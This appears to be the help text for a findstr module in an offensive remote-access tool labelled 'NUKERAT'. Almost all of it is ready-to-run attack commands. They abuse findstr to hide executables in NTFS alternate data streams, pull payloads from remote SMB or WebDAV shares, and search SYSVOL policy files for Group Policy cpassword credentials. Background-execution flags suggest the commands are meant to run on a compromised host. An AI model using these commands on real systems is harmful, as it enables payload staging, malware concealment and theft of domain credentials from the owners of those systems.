ABOUT
    String search utility. LOLBAS writes binaries into ADS via
    forced mismatch searches, pulls payloads from WebDAV into ADS or
    plain files, and hunts cpassword values under SYSVOL.

USAGE:
    findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
    findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
    findstr /S /I cpassword \\sysvol\policies\*.xml
    findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}

EXAMPLES:
    findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
    findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
    findstr /S /I cpassword \\sysvol\policies\*.xml
    findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
